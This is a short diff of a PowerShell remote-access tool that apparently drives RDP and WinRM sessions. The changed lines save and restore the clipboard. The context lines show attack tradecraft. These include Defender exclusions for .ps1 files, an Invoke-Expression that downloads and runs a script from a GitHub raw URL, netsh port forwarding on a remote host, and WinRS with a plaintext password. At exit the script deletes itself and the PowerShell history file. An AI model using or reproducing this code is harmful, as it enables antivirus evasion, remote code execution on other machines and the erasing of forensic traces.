@@ -236,7 +236,7 @@ if($Language -in 'Spanish') {
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null }
 
     do { Show-Banner ; Show-Menu
-    $currentuser = [Environment]::username
+    $currentuser = [Environment]::username ; $Clipboard = Get-Clipboard
     $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {
 
@@ -649,4 +649,4 @@ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubu
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }} if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }}
-$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null
+$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $Clipboard 2>&1> $null
